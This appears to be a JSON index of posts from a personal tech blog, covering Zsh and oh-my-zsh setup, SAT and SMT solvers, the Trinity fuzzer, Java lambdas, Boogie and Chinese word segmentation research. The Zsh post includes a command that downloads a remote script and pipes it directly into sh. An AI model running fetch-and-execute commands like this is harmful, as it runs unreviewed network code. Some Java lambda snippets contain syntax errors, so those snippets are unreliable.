~/.bash_profile就可以将.bash_profile里的配置全部引入到.zshrc中了。同理，如果你想自己写配置，也可以通过这种方式引入。（后文你将看到一个第三方工具就是这么做的。） 安装oh my zsh 通过wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh指令安装。 这时我们发现在.zshrc文件中，多了两行： 12 export ZSH=/Users/NAME/.oh-my-zshsource $ZSH/oh-my-zsh.sh 自定义Shell主题 使用oh my zsh主要的原因是使用其提供的漂亮的主题，主题目录在.oh-my-zsh/themes/下，选择主题ZSH_THEME=&quot;robbyrussell&quot;。这时我的Shell主题就是robbyrussell了。 打开robbyrussell.zsh-theme文件，我们可以看见几条配置。 我将其中的PROMPT修改为： PROMPT='${ret_status} %{$fg[cyan]%}%d %{$reset_color%} $(git_prompt_info)%{$fg_bold[red]%}&gt;%{$fg_bold[yellow]%}&gt;%{$fg_bold[green]%}&gt; ' 这时我的Shell就变成了这样： 可以发现我的定制有：显示绝对路径，&gt;&gt;&gt;等。 还有很多主题与配置，大家可以自己尝试。 定制Shell Zsh还有个功能就是“别名”。不知道大家有没有这样的经历，需要打开.plist这样的文件，如果用普通编辑器打开会非常界面不友好，而用Xcode打开则完美可观。那怎么在控制台直接用Xcode打开文件呢？（其他软件同理） 我在.zshrc中添加：alias xcode=&quot;/Applications/Xcode.app/Contents/MacOS/Xcode&quot;，之后我就可以使用xcode X来用Xcode打开X文件了。 我们也可以为某种类型文件设置默认打开方式：alias -s html=atom（当我们键入.html文件时，会自动用Atom打开）。 安装插件 oh my zsh为Zsh提供了100+插件，如果我们需要安装某插件，只需要在.zshrc文件中的plugins=()中添加，用空格隔开，只需要填插件名字，默认添加了git。 在这里我向大家介绍几种网上很常见的插件： git当你处于一个 git 受控的目录下时，Shell 会明确显示 「git」和 branch，如上图所示，另外对 git 很多命令进行了简化，例如 gco=’git checkout’、gd=’git diff’、gst=’git status’、g=’git’等等，熟练使用可以大大减少 git 的命令长度，命令内容可以参考~/.oh-my-zsh/plugins/git/git.plugin.zsh。 osxtab 增强，quick-look filename 可以直接预览文件，man-preview grep 可以生成 grep手册 的pdf 版本等。 autojump像他的名字一样，提供自动补全等很多功能，大家自己去尝试吧。 注意：安装autojump建议使用Homebrew brew install autojump 然后按照提示将一句类似这个 [ -f /usr/local/etc/profile.d/autojump.sh ] &amp;&amp; . /usr/local/etc/profile.d/autojump.sh 的句子插入到.zshrc文件中即可。 本文链接： http://www.meng.uno/articles/d911b12b/ 欢迎转载！","categories":[{"name":"Shells","slug":"Shells","permalink":"http://www.meng.uno/categories/Shells/"}],"tags":[{"name":"Zsh","slug":"Zsh","permalink":"http://www.meng.uno/tags/Zsh/"}]},{"title":"Deep Learning上手工具","slug":"tools4DP","date":"2018-01-10T14:43:43.000Z","updated":"2018-02-17T02:11:39.642Z","comments":true,"path":"articles/99be2c50/","link":"","permalink":"http://www.meng.uno/articles/99be2c50/","excerpt":"现在Deep Learning太火了，以至于没有任何计算机基础的人都想使用它，那么对于新手，甚至连Python代码都写不好的DL爱好者，有什么上手工具么？选择合适的工具可以帮助学习更快，很巧的是，有很多不同的工具可供选择，下图列出了常用的工具。 谷歌开发的Tensorflow，微软的CNTK以及Theano都是为深度学习而开发的库，它们促进了使用GPU计算。他们并不难，但与Keras相比，他们仍然非常复杂。Keras只是使用底层深度学习库的界面。使用Keras就像玩乐高一样简单。我建议初学者从Keras开始，因为我们可以快速了解深度学习可以做些什么，并积极进行一些有趣的项目。 本文","text":"现在Deep Learning太火了，以至于没有任何计算机基础的人都想使用它，那么对于新手，甚至连Python代码都写不好的DL爱好者，有什么上手工具么？选择合适的工具可以帮助学习更快，很巧的是，有很多不同的工具可供选择，下图列出了常用的工具。 谷歌开发的Tensorflow，微软的CNTK以及Theano都是为深度学习而开发的库，它们促进了使用GPU计算。他们并不难，但与Keras相比，他们仍然非常复杂。Keras只是使用底层深度学习库的界面。使用Keras就像玩乐高一样简单。我建议初学者从Keras开始，因为我们可以快速了解深度学习可以做些什么，并积极进行一些有趣的项目。 本文链接： http://www.meng.uno/articles/99be2c50/ 欢迎转载！","categories":[{"name":"AI","slug":"AI","permalink":"http://www.meng.uno/categories/AI/"},{"name":"Deep Learning","slug":"AI/Deep-Learning","permalink":"http://www.meng.uno/categories/AI/Deep-Learning/"}],"tags":[{"name":"Deep Learning","slug":"Deep-Learning","permalink":"http://www.meng.uno/tags/Deep-Learning/"}]},{"title":"CryptoMinisat","slug":"CryptoMinisat","date":"2018-01-10T13:50:36.000Z","updated":"2018-02-11T14:04:49.150Z","comments":true,"path":"articles/7d26fe8/","link":"","permalink":"http://www.meng.uno/articles/7d26fe8/","excerpt":"Inspired by other verification system projects, I want to further explore the means of verification they used such as SMT solver, SAT solver, Coq and so on. I’ll start with this report from an advanced SAT solver — CryptoMinisat. (I have written a report about STP which is a SMT solver.) The Boolea","text":"Inspired by other verification system projects, I want to further explore the means of verification they used such as SMT solver, SAT solver, Coq and so on. I’ll start with this report from an advanced SAT solver — CryptoMinisat. (I have written a report about STP which is a SMT solver.) The Boolean Satisfiability Problem (SAT for short) is the problem of determining if there exists an interpretation that satisfies a given boolean formula. In other words, it asks whether the variables of a given boolean formula can be consistently replaced by the values TRUE or FALSE in such a way that the formula evaluates to TRUE. If this is the case, the formula is called satisfiable. Otherwise, the formula is unsatisfiable. SAT solvers have recently been enjoying a boom in the application front: more and more applications can and do make use of SAT solvers to accomplish tasks ranging from the fairly trivial to the very complex. The benefit of the incredible improvements in the design of efficient SAT solvers those recent years is now reaching our lives: The Intel Core7 processor for instance has been designed with the help of SAT technology, while the device drivers of Windows 7 are being certified thanks to an SMT solver (based on a SAT solver). Build and Test This is the 5th version of CryptoMinisat which means the install instruction is very prefect now. To build and test this project, all we have to do is following the instruction. Firstly, we need to install many dependencies. Then, it is very simple to build by “make”. The following is part of the output. Testing this project is very easy by the script written by the authors. Typing “make test” and waiting for a moment, we will get this output which means the tests are correct. Run This Project This is a very mature project which can be run from the terminal or used as a C++/Python library. In this report, I just choose the first way. As I said before, this project is a SAT solver which means it could find out the situations which fulfill the input or return error. The grammar is very simple just like this. The first line means this input has 2 variables and 4 clauses. Every line is a clause which is ended by “0”. Using the third line as an example, it says that 2 is TRUE and 3 is FALSE. I use this file as an input and run it in the terminal. The result is shown as follows. It means 1 is TRUE, 2 and 3 are FALSE is the only solution to this problem. This is another example and the result. It means there isn’t a solution to this problem. How It Works There are many improvements and techniques included in this project. It uses “Minisat” as its core and uses Gaussian Elimination on top-level. This is another part of its techniques. Variable elimination and replacement, strengthening and subsumption; Gate-based clause shortening and removal; No time or memory-outs on weird CNFs; Variable renumbering and variable number hiding. due to this, XOR clauses are cut and the added variables are always consistently displayed; Temporary results are stored in SQLite which supports high speed update; XOR recovery. 本文链接： http://www.meng.uno/articles/7d26fe8/ 欢迎转载！","categories":[{"name":"solver","slug":"solver","permalink":"http://www.meng.uno/categories/solver/"},{"name":"SAT","slug":"solver/SAT","permalink":"http://www.meng.uno/categories/solver/SAT/"}],"tags":[{"name":"CryptoMinisat","slug":"CryptoMinisat","permalink":"http://www.meng.uno/tags/CryptoMinisat/"},{"name":"SAT","slug":"SAT","permalink":"http://www.meng.uno/tags/SAT/"},{"name":"solver","slug":"solver","permalink":"http://www.meng.uno/tags/solver/"}]},{"title":"Trinity","slug":"trinity","date":"2018-01-05T14:37:53.000Z","updated":"2018-02-11T14:48:52.839Z","comments":true,"path":"articles/664baed9/","link":"","permalink":"http://www.meng.uno/articles/664baed9/","excerpt":"As we all known, system call testing is very important to a system. System call fuzzers aren’t a particularly new idea. A few projects began from the mid-2000s with the aim of bringing more sophistication to the fuzz-testing process. One of them, Scrashme, was started in 2006. Work on that project l","text":"As we all known, system call testing is very important to a system. System call fuzzers aren’t a particularly new idea. A few projects began from the mid-2000s with the aim of bringing more sophistication to the fuzz-testing process. One of them, Scrashme, was started in 2006. Work on that project languished for a few years, and only picked up momentum starting in late 2010, when the authors began to devote significantly more time to its development. In December 2010, Scrashme was renamed to Trinity which is this project. Trinity is an intelligent system call fuzzer since it incorporates specific knowledge about each system call which is tested. Its thought is to reduce the time spent running “useless” tests, so reaching deeper into the tested code and increasing the chances of testing a more interesting case that may result in an unexpected error. Build and Run We can get the source code from GitHub, compile the code and invoke Trinity with a command line as simple as “./trinity”. Building this project is very simple, we just need to enter the directory and “./configure; make”. It’s so simple that the authors didn’t write it out. The result of a successful “make” is like this: Now let’s run it. I will test a system call “madvise” as an example. From the above picture, we can see that there are 384 32 bits system calls and 333 64 bits system calls tested in this project (not all in this test case). The log information of the main test process and its children processes are stored separately like this. This project also has many other test modes which I didn’t test here. Trinity has been rather successful at finding bugs if we fully test it. It said that the authors of this project had sometimes left systems running for hours or days in order to discover failures. Analyze the Test Here is the segment of the code of system call “madvise”. This is a structure definition, from which we can see Trinity has some understanding of the arguments for each system call. This is why it brings intelligence to its tests. The “.num_args” means that this system call need 3 parameters. These parameters are “arg1, arg2, arg3” whose names and types are defined as the picture shows. I found the architecture of Trinity from its website. From this picture, we know that the “trinity-main” process kicks off a number of child processes (It is 4 in this picture) that perform the system call tests. There is a shared memory region used to record various pieces of global information, such as open file descriptor numbers, total system calls performed, and number of system calls that succeeded and failed. The shared memory region also records various information about each of the child processes as the picture shown in the “Build and Run” section. The “trinity-watchdog” process ensures that the test system is still working correctly which is similar to the function of “Zookeeper” to “Hadoop”, I think. Write A Test First, we need to select a system call for testing. I choose “getcpu” system call here from “syscalls.h” file. (We need to delete the original test file because all system call listed in “syscalls.h” are tested.) Then I write a new file to “/trinity/syscalls/” directory named “meng.c” and the contents are as follows. The type of parameters can be found at “syscall.h” as follows. After compiling the file and running, here is part of the result. In the future, I may add some system calls which it didn’t test till now to this project. However, you can see that it is very difficult for us to really test a system call which we used everyday using this project because Trinity randomly invokes system calls currently and real programs demonstrate common patterns for making system calls. 本文链接： http://www.meng.uno/articles/664baed9/ 欢迎转载！","categories":[{"name":"Fuzzer","slug":"Fuzzer","permalink":"http://www.meng.uno/categories/Fuzzer/"}],"tags":[{"name":"Trinity","slug":"Trinity","permalink":"http://www.meng.uno/tags/Trinity/"},{"name":"Fuzzer","slug":"Fuzzer","permalink":"http://www.meng.uno/tags/Fuzzer/"}]},{"title":"Java中的Lambda表达式","slug":"lambda-0","date":"2018-01-04T06:16:45.000Z","updated":"2018-04-04T06:32:50.684Z","comments":true,"path":"articles/1eac83ce/","link":"","permalink":"http://www.meng.uno/articles/1eac83ce/","excerpt":"Lambda表达式 要理解lambda表达式，首先要了解的是函数式接口（functional interface）。简单来说，函数式接口是只包含一个抽象方法的接口。比如Java标准库中的java.lang.Runnable和java.util.Comparator都是典型的函数式接口。对于函数式接口，除了可以使用Java中标准的方法来创建实现对象之外，还可以使用lambda表达式来创建实现对象。这可以在很大程度上简化代码的实现。在使用lambda表达式时，只需要提供形式参数和方法体。由于函数式接口只有一个抽象方法，所以通过lambda表达式声明的方法体就肯定是这个唯一的抽象方法的实现，而且形式","text":"Lambda表达式 要理解lambda表达式，首先要了解的是函数式接口（functional interface）。简单来说，函数式接口是只包含一个抽象方法的接口。比如Java标准库中的java.lang.Runnable和java.util.Comparator都是典型的函数式接口。对于函数式接口，除了可以使用Java中标准的方法来创建实现对象之外，还可以使用lambda表达式来创建实现对象。这可以在很大程度上简化代码的实现。在使用lambda表达式时，只需要提供形式参数和方法体。由于函数式接口只有一个抽象方法，所以通过lambda表达式声明的方法体就肯定是这个唯一的抽象方法的实现，而且形式参数的类型可以根据方法的类型声明进行自动推断。 在工作中创建一个线程的写法如下： 1234567 public void runThread() &#123; new Thread(new Runnable() &#123; public void run() &#123; System.out.println(&quot;test&quot;); &#125; &#125;).start();&#125; Java 8 中 Lambda 表达式一般格式： 1 (argument) -&gt; &#123;body&#125; argument表示的是方法中的形式参数，如果没有直接放空，后面的body是方法体。 所以第一个Demo中的代码可以简化如下: 12345 public void runThread() &#123; new Thread( () -&gt; &#123;System.out.println(&quot;test&quot;);&#125; ).start();&#125; 方法体总只有一句代码所以可以继续简化: 12345 public void runThread() &#123; new Thread( () -&gt; System.out.println(&quot;test&quot;); ).start();&#125; 下面是一些常见的lambda表达式，可以加上参数类型: 123456 (int a, int b) -&gt; &#123; return a + b; &#125;() -&gt; System.out.println(&quot;Hello World&quot;);(String s) -&gt; &#123; System.out.println(s); &#125;() -&gt; 42() -&gt; &#123; return 3.1415 &#125;;a -&gt; return a * a; // 形式参数中只有a 你也可以自己编写函数式接口: 1234 @FunctionalInterfacepublic interface Annimal &#123; public abstract void play();&#125; @FunctionalInterface是 Java 8 新加入的一种接口，用于指明该接口类型声明是根据 Java 语言规范定义的函数式接口。Java 8 还声明了一些 Lambda 表达式可以使用的函数式接口，当你注释的接口不是有效的函数式接口时，可以使用 @FunctionalInterface 解决编译层面的错误。 另外，在 Java 8中接口支持方法的实现，对函数式接口并不影响: 1234567891011 @FunctionalInterface@RequiresApi(api = Build.VERSION_CODES.N)public interface Annimal &#123; public abstract void play(); default void fly()&#123; System.out.println(&quot;fly&quot;); &#125; static void eat()&#123; System.out.println(&quot;eat&quot;); &#125;&#125; 上面的书写并不会编译报错，也是符合规范的，但是如果添加普通的方法就会报错，所以最好在接口上使用注解@FunctionalInterface进行声明，以免团队的其他人员错误地往接口中添加新的方法。 Lambda表达式与匿名类的区别 使用匿名类与 Lambda 表达式的一大区别在于关键词的使用。对于匿名类，关键词this解读为匿名类，而对于 Lambda 表达式，关键词this解读为写就 Lambda 的外部类。 Lambda 表达式与匿名类的另一不同在于两者的编译方法。Java 编译器编译 Lambda 表达式并将他们转化为类里面的私有函数，它使用 Java 7 中新加的invokedynamic指令动态绑定该方法。 本文链接： http://www.meng.uno/articles/1eac83ce/ 欢迎转载！","categories":[{"name":"Java开发Tips","slug":"Java开发Tips","permalink":"http://www.meng.uno/categories/Java开发Tips/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://www.meng.uno/tags/Java/"},{"name":"Lambda","slug":"Lambda","permalink":"http://www.meng.uno/tags/Lambda/"}]},{"title":"Boogie","slug":"boogie","date":"2018-01-03T14:43:12.000Z","updated":"2018-02-11T14:48:52.838Z","comments":true,"path":"articles/4f0a9591/","link":"","permalink":"http://www.meng.uno/articles/4f0a9591/","excerpt":"Boogie is an intermediate verification language (IVL), intended as a layer on which to build program verifiers for other languages. It is also the name of the verification tool that takes Boogie programs as input. It can accept the input of a Boogie program and generate verification conditions that","text":"Boogie is an intermediate verification language (IVL), intended as a layer on which to build program verifiers for other languages. It is also the name of the verification tool that takes Boogie programs as input. It can accept the input of a Boogie program and generate verification conditions that are passed to an SMT solver such as Z3 used by my test. Build and Run Building this project is very simple, however, we may need to install many other tools such as “Mono” (I use a MacBook to build this project) and “NuGet”. The information of successfully building is like this. There are two kinds of verifications said by the authors: Driver tests and Unit tests, however, I couldn’t find the python script for the latter, so I just run the driver tests. Driver Tests In this kind of tests, we need to use “lit” and “OutputCheck”. We could run all the tests by “lit .”. The result is shown as follows. We also could run a single test by giving “lit” a specific folder or file. The picture is a test of a folder. Analyze the Test The picture is a function written by Boogie, from which we can see that the Boogie language is something like C language. In addition, in every Boogie file, every function is separated. If there are some errors occurred, there will be a “.expect” file outputted like this to tell us why they are wrong. Write A Test We can write a new file or just add our function to a existed file. The following is my test: This is the result: I plan to analyze this project deeply, however, its code is very old so it maybe a little difficult for me to do this. I just do these tests on this projects now. Maybe I will analyze the whole project some day. From this project, I can learn what is an intermediate verification language (IVL) and how it works. I found that there were many tools adapting this strategy, including the VCC and HAVOC verifiers for C and the verifiers for Dafny, Chalice, and Spec#. 本文链接： http://www.meng.uno/articles/4f0a9591/ 欢迎转载！","categories":[{"name":"Language","slug":"Language","permalink":"http://www.meng.uno/categories/Language/"}],"tags":[{"name":"Boogie","slug":"Boogie","permalink":"http://www.meng.uno/tags/Boogie/"},{"name":"Language","slug":"Language","permalink":"http://www.meng.uno/tags/Language/"}]},{"title":"Simple Theorem Prover SMT solver","slug":"stp","date":"2018-01-03T13:42:58.000Z","updated":"2018-02-11T14:04:49.153Z","comments":true,"path":"articles/cd3afb7d/","link":"","permalink":"http://www.meng.uno/articles/cd3afb7d/","excerpt":"I found it could be generated as program analysis tools, theorem provers, automated bug finders and so on which means it is a very crucial research. STP is a constraint solver aimed at solving constraints of bit vectors and arrays. It can read CVC, SMT-LIB1 and SMT-LIB2 formats files. It also could","text":"I found it could be generated as program analysis tools, theorem provers, automated bug finders and so on which means it is a very crucial research. STP is a constraint solver aimed at solving constraints of bit vectors and arrays. It can read CVC, SMT-LIB1 and SMT-LIB2 formats files. It also could be used by Python, SMT-LIBv2 and even C library. STP preprocesses the input through the application of mathematical and logical identities, and then eagerly translates constraints into a purely propositional logic formula that it feeds to an off-the-shelf SAT solver. STP views memory as untyped bytes. It provides only three data types: booleans, bitvectors, and arrays of bitvectors. A bitvector is an unsigned, fixed-length sequence of bits. For example, “0010” is a constant, 4-bit bitvector representing the constant 2. Build and Run We can build this project on Linux or Docker, however, you know, Google isn’t well supported in China, so I can’t use “repo” execution which needed by Docker. In this document, I will use a quick install. Firstly, we need to install many dependencies. Then, since STP uses “minisat” as its SAT solver by default, we need to install it first. It is very simple to do this by “cmake”. The following is part of the output. Then we could start to install STP (To get the code, we need to use “git clone” but not download it directly). This project depends on various external tools to do testing. Here we install “lit” and do some individual tests and use “GoogleTest” to write some unit tests. Analyze Individual Test An individual test is like this. In this screenshot, we can see that this file is judging “b = (c || b)” and “((c || b) = b) &lt; c &lt; b”. We could find that an individual test file may contain these components: “; line”: comments; “set-info”: set some configuration information for running this file; “declare-fun”: definite some functions and their return types; “assert”: like C lang, do some judgement; “exit”: return. Analyze Unit Test We can simply run unit test by giving “lit” the individual tests directory or run “make C-api-tests” to build the C-api tests as unit tests. The Cpp file is like this. From this picture, we can see that a C-api test contains many simple verifications. Analyze the Code Structure From the above picture, I give the following simple understandings to this project. “Interface”: Define a C interface to achieve the file ins and outs; “Sat”: Copy from “minisat” to call SAT solver. “AST”: Implement the abstract syntax tree for parsed solver inputs; “Util”: Store some header files for small tasks; “Printer”: Appoint some output formats; “Simplifier”: Simplify algorithms for AST; “Parser”: Store some parsers for the CVC, SMT-LIB1, SMT-LIB2 inputs; “STPManager”: Hold all components together. 本文链接： http://www.meng.uno/articles/cd3afb7d/ 欢迎转载！","categories":[{"name":"solver","slug":"solver","permalink":"http://www.meng.uno/categories/solver/"},{"name":"SMT","slug":"solver/SMT","permalink":"http://www.meng.uno/categories/solver/SMT/"}],"tags":[{"name":"solver","slug":"solver","permalink":"http://www.meng.uno/tags/solver/"},{"name":"STP","slug":"STP","permalink":"http://www.meng.uno/tags/STP/"},{"name":"SMT","slug":"SMT","permalink":"http://www.meng.uno/tags/SMT/"}]},{"title":"跨领域分词国内外研究现状","slug":"word-seg-history","date":"2017-12-22T12:15:00.000Z","updated":"2018-02-13T14:06:49.673Z","comments":true,"path":"articles/e38d3f1c/","link":"","permalink":"http://www.meng.uno/articles/e38d3f1c/","excerpt":"国内研究 国内研究中文分词的科研单位主要有：中科院、清华、北大、北京语言学院、东北大学、MSRA、IBM研究院以及哈工大等。 国内主要的成熟的分词系统：ICTCLAS（汉语词法分析系统）、海量信息、盘古分词、结巴分词、BosonNLP以及**哈工大语言云（LTP-Cloud）**等。 国内在中文分词算法的研究上进展颇丰，参与的科研机构也比较多，使用的方法也比较杂乱，从[1]—[19]可以看出。国内分词算法上的进展主要有：2005年，哈工大[13]在分词阶段以基于词的n-gram方法为核心。先将词按照词典初步切分，并从训练语料统计得到3-gram信息，动态规划计算哪条切分路径最优。但在命名实","text":"国内研究 国内研究中文分词的科研单位主要有：中科院、清华、北大、北京语言学院、东北大学、MSRA、IBM研究院以及哈工大等。 国内主要的成熟的分词系统：ICTCLAS（汉语词法分析系统）、海量信息、盘古分词、结巴分词、BosonNLP以及**哈工大语言云（LTP-Cloud）**等。 国内在中文分词算法的研究上进展颇丰，参与的科研机构也比较多，使用的方法也比较杂乱，从[1]—[19]可以看出。国内分词算法上的进展主要有：2005年，哈工大[13]在分词阶段以基于词的n-gram方法为核心。先将词按照词典初步切分，并从训练语料统计得到3-gram信息，动态规划计算哪条切分路径最优。但在命名实体识别、新词识别、消除分词歧义部分使用ME模型。2007年，赵海等人[19]研究了基于子串标注的分词算法，在Bakeoff-2005测试集上准确度较高。2009年，[3]利用一种基于N元语法的汉语自动分词系统, 将分词与标注结合起来, 用词性标注来参与评价分词结果。[34]提出了一种字词联合解码的分词方法，算法中使用了字、词信息，充分发挥由字构词识别未登录词的能力。2010年，[35]提出基于词边界分类的分词方法，该方法对字符之间的边界进行分类，判断是否为词的边界，从而达到分词目的。[36]将基于字的生成模型与基于字的判别模型进行联合。2014年，[29]对[28]的模型做了重要改进，引入了标签向量来更精细地刻画标签之间的转移关系，其改进程度类似于引入Markov特征到最大熵模型之中。2015年，为了更完整精细地对分词上下文建模，[30]提出了一种带有自适应门结构的递归神经网络(GRNN)抽取n-gram特征，其中的两种定制的门结构（重置门、更新门）被用来控制n-gram信息的融合和抽取。2016年，[31]将GRNN和LSTM联合起来使用。该模型中，先用双向LSTM提取上下文敏感的局部信息，然后在滑动窗口内将这些局部信息用带门结构的递归神经网络融合起来，最后用作标签分类的依据。[32]提出了一种基于转移的模型用于分词，并将传统的特征模版和神经网络自动提取的特征结合起来，在神经网络自动提取的特征和传统的离散特征的融合方法做了尝试。2017年，[33]通过简化网络结构，混合字词输入以及使用早期更新（early update）等收敛性更好的训练策略，设计了一个基于贪心搜索(greedy search)的快速分词系统。该算法与之前的深度学习算法相比不仅在速度上有了巨大提升，分词精度也得到了进一定提高。 在领域自适应方面相关研究比较少，2008年，[45]利用并发展针对单个汉字的构词能力和构词模式公式, 计算词的构词能力和词的构词模式, 并以此作为新词发现的规则, 对科技领域做了新词发现和新技术发现的实验。2012年，[41]通过将外部词典信息融入统计分词模型 (使用CRF 统计模型)来实现领域自适应性。在确定一个领域并给出这个领域的文献数据集合的前提下，[44]主要从这两个步骤进行新词发现：首先对特定领域的文献集合进行分词处理，在进行分词处理方面使用了基于统计的N-Gram方法，较为有效地找出了词典中所不存在地新词汇；第二个步骤为新的专业词汇的抽取，这是一个根据已有专业词汇来发现未知专业词汇的过程，目的从第一步中所产生的新的词汇中抽取出新的属于目标领域的专业词汇，在这个步骤中，使用了Apriori方法。2013年，[40]实现了基于生语料的领域自适应分词模型和双语引导的汉语分词，并提出融合多种分词结果的方法，通过构建格状(Lattice)结构并使用动态规划算法得到较佳汉语分词结果。2015年，[39]提出Active Learning与n-gram统计特征相结合，通过对目标领域文本与已有标注语料差异统计分析，选择含有最多未标记过得语言现象的小规模语料优先进行人工标注的方法，此法验证在科技文献上有所提高。[43]提出使用卡方统计 量以及边界熵提升未登录词的处理能力，并结合自学习和协同学习策略进一步改善字标注分词方法在领域适应性方面的性能。2016年，[42]提出一种条件随机场与领域词典相结合的方法提高领域自适应性，并根据构词规则提出了固定词串消解，动词消解，词概率消解三种方法消除歧义。 国外研究 国外研究中文分词的主要科研机构有：斯坦福、SUTD、UC Berkeley、CMU、CityU等。 国外成熟的分词系统有：Core NLP（斯坦福 NLP Group）、Zpar（SUTD）、Basis Technology、Open NLP (Apache 基金会)等。 国外分词算法上的进展：2003年之前，主要集中在词典与人工规则相结合，词典与概率统计规则相结合。2005年，开始使用基于字序列标注的分词方法，该方法始于[20]，第一次将严格的串标注学习应用于分词在[21]和[22]之后。[23]与[24]的出现，基于CRF模型崭露头角，在此之后，CRF多个变种构成了深度学习时代之前的标准分词模型。基于词的随机过程建模导致一个CRF变种，即semi-CRF(半条件随机场)模型的直接应用。2006年，基于字序列标注的方法已经开始盛行，核心模型仍然是ME与CRF，同年，[25]发表semi-CRF的第一个分词实现。[26]提出了一种基于子词（subword）的标注学习，基本思路是从训练集中抽取高频已知词构造子词词典。2007年，ME的方法已经开始退出舞台，CRF越来越成为主流。2010年，核心方法还是基于CRF模型，后处理是SVM-HMM模型。2011年，当子串的抽取和统计度量得分计算扩展到训练集之外，[27]实际上提出了一种扩展性很强的半监督分词方法，实验也验证了其有效性。2013年，[28]提出神经网络中文分词方法，首次验证了深度学习方法应用到中文分词任务上的可行性。 在领域自适应上，由耶鲁大学教授提出的Active Learning得到了较为广泛的使用。 待补充 参考文献 [1] 马晏. 基于评价的汉语自动分词系统的研究与实现[D]. 清华大学, 1991. [2] 张国兵, 李淼. 一种基于局部歧义词网格的快速分词算法[J]. 计算机工程与应用, 2008, 44(12):175-177. [3] 石佳, 蔡皖东. 基于N元语法的汉语自动分词系统研究[J]. 微电子学与计算机, 2009, 26(7):98-101. [4] 韩莹, 王茂发, 陈新房,等. 汉语自动分词词典新机制—词值哈希机制[J]. 计算机系统应用, 2013, 22(2):233-235. [5] 蒋才智, 王浩. 基于memcached的动态四字双向词典机制[J]. 计算机应用研究, 2011, 28(1):152-154. [6] 刘超, 王卫东. 基于双哈希词典机制中文分词的研究[J]. 信息技术, 2016, 40(11). [7] 刘挺, 吴岩, 王开铸. 串频统计和词形匹配相结合的汉语自动分词系统[J]. 中文信息学报, 1998, 12(1):17-25. [8] 唐涛. 面向特定领域的中文分词技术的研究[D]. 沈阳航空航天大学, 2012. [9] 卢志茂, 刘挺, 郎君,等. 神经网络和贝叶斯网络在汉语词义消歧上的对比研究[J]. 高技术通讯, 2004, 14(8):15-19. [10] 廖先桃, 于海滨, 秦兵,等. HMM与自动规则提取相结合的中文命名实体识别[C]// 全国学生计算语言学研讨会. 2004. [11] 程志刚. 基于规则和条件随机场的中文命名实体识别方法研究[D]. 华中师范大学, 2015. [12] 祝继锋. 基于SVM和HMM算法的中文机构名称识别[D]. 吉林大学, 2017. [13] ZHUORAN WANG, TING LIU. Chinese Unknown Word Identification Based on Local Bigram Model[J]. International Journal of Computer Processing of Oriental Languages, 2012, 1(3):185-196. [14] 原媛, 彭建华, 张汝云. 基于统计的汉语词义消歧研究[J]. 信息工程大学学报, 2007, 8(4):501-504. [15] 肖建涛. 基于最大熵原理的汉语词义消歧与标注语言模型研究[D]. 北京机械工业学院 北京信息科技大学, 2007. [16] 张旭. 一个基于词典与统计的中文分词算法[D]. 电子科技大学, 2007. [17] 佟德琴. 基于字词联合解码的中文分词研究[D]. 大连理工大学, 2011. [18] 赵海, 揭春雨, 宋彦. 基于字依存树的中文词法-句法一体化分析[C]// 中国计算机语言学研究前沿进展. 2009. [19] 赵海, 揭春雨. 基于有效子串标注的中文分词[J]. 中文信息学报, 2007, 21(5):8-13. [20] Nianwen Xue. Chinese Word Segmentation as Character Tagging. Computational Linguistics and Chinese Language Processing, 8(1), 2003, pp. 29–48. [21] Hwee Tou Ng and Jin Kiat Low. Chinese part-of-speech tagging: One-at-a-time or all-at-once? word-based or character-based? In Conference on Empirical Methods in Natural Language Processing, 2004, pp. 277–284. [22] Jin Kiat Low, Hwee Tou Ng, and Wenyuan Guo. A maximum entropy approach to Chinese word segmentation. In Proceedings of the SIGHAN Workshop on Chinese Language Processing, 2005, pp. 448–455. [23] Huihsin Tseng, Pichuan Chang, Galen Andrew, Daniel Jurafsky, and Christopher Manning. A conditional random field word segmenter for SIGHAN bakeoff 2005. In Proceedings of the SIGHAN workshop on Chinese language Processing, vol. 171, 2005. [24] Fuchun Peng, Fangfang Feng, and Andrew McCallum. Chinese segmentation and new word detection using conditional random fields. In Proceedings of the international conference on Computational Linguistics, 2004, pp. 562–569. [25] Galen Andrew. A hybrid Markov/semi-Markov conditional random field for sequence segmentation. In Proceedings of the Conference on Empirical Methods in Natural Language Processing, 2006, pp. 465– 472. [26] Ruiqiang Zhang, Genichiro Kikui, and Eiichiro Sumita. Subword-based tagging for confidence-dependent Chinese word segmentation. In Proceedings of the Annual Meeting of the Association for Computational Linguistics and the international conference on Computational Linguistics, 2006, pp. 961–968. [27] Hai Zhao and Chunyu Kit. Integrating Unsupervised and Supervised Word Segmentation: the Role of Goodness Measures. Information Sciences, 181(1), 2011, pp. 163–183. [28] Xiaoqing Zheng, Hanyang Chen, and Tianyu Xu. Deep learning for Chinese word segmentation and POS tagging. In Proceedings of the Conference on Empirical Methods in Natural Language Processing, 2013, pp.647–657. [29] Wenzhe Pei, Tao Ge, and Baobao Chang. Max-margin tensor neural network for Chinese word segmentation. In Proceedings of the Annual Meeting of the Association for Computational Linguistics, 2014, pp. 293–303. [30] Xinchi Chen, Xipeng Qiu, Chenxi Zhu, and Xuanjing Huang. Gated recursive neural network for Chinese word segmentation. In Proceedings of the Annual Meeting of the Association for Computational Linguistics and the 7th International Joint Conference on Natural Language Processing, 2015a, pp. 1744–1753. [31] Jingjing Xu and Xu Sun. Dependency-based gated recursive neural network for Chinese word segmentation. In Proceedings of the Annual Meeting of the Association for Computational Linguistics (Volume 2: Short Papers), 2016, pp. 567–572. [32] Meishan Zhang, Yue Zhang, and Guohong Fu. Transition-based neural word segmentation. In Proceedings of the Annual Meeting of the Association for Computational Linguistics, 2016, pp. 421–431. [33] Deng Cai, Hai Zhao, Zhisong Zhang, Yuan Xin, Yongjian Wu, and Feiyue Huang. Fast and accurate neural word segmentation for Chinese. In Proceedings of the Annual Meeting of the Association for Computational Linguistics, 2017. [34] 宋彦, 蔡东风, 张桂平,等. 一种基于字词联合解码的中文分词方法[J]. 软件学报, 2009, 20(9):2366-2375. [35] 李寿山, 黄居仁. 基于词边界分类的中文分词方法[J]. 中文信息学报, 2010, 24(1):3-7. [36] Wang K, Su K Y, Su K Y. A character-based joint model for Chinese word segmentation[C]// International Conference on Computational Linguistics. Association for Computational Linguistics, 2010:1173-1181. [37] 王娟, 曹庆花, 黄精籼,等. 基于受限领域的中文分词系统[J]. 信息系统工程, 2011(11):106-106. [38] 张少阳. 领域自适应中文分词系统的研究与实现[D]. 